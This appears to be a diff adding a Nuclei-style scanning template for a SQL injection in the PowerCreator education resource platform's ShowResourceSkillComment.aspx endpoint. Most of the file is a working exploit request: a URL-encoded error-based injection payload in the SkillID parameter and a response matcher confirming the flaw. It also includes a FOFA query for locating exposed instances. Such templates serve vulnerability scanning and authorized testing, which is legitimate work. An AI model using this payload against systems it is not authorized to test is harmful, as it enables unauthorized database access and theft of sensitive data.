@@ -1,0 +1,26 @@
+id: powercreator-showresourceskillcomment-sql
+
+info:
+  name: "PowerCreator 教育资源管理平台 ShowResourceSkillComment.aspx SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="PowerCreator-CMS"
+          PowerCreator 教育资源管理平台的 ShowResourceSkillComment.aspx 接口存在SQL注入漏洞。攻击者可通过构造恶意输入执行任意SQL命令，从而获取数据库中的敏感信息或操控服务器数据。
+  tags: PowerCreator
+
+http:
+- raw:
+  - |
+    GET /ShowResourceSkillComment.aspx?rid=3&SkillID=1%20AND%204312%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284312%3D4312%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Cookie: ASP.NET_SessionId=l2wuj2tri5e554020jeezoyw; language=simpleChineses
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qzjjq'
